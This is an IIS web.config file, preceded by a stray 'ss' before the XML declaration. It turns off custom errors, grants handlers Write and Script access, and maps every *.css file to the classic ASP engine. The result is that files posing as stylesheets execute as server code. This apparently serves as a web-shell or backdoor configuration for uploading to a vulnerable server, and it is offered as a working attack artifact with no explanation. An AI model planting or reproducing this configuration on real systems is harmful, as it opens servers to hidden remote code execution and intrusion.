ss<?xml version="1.0" encoding="UTF-8"?>
<configuration>
	<system.web>
		<customErrors mode="Off"/>
	</system.web>
<system.webServer>
	<handlers accessPolicy="Read, Script, Write">
	<add name="mytxt" path="*.css" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" />
	</handlers>
</system.webServer>
</configuration>
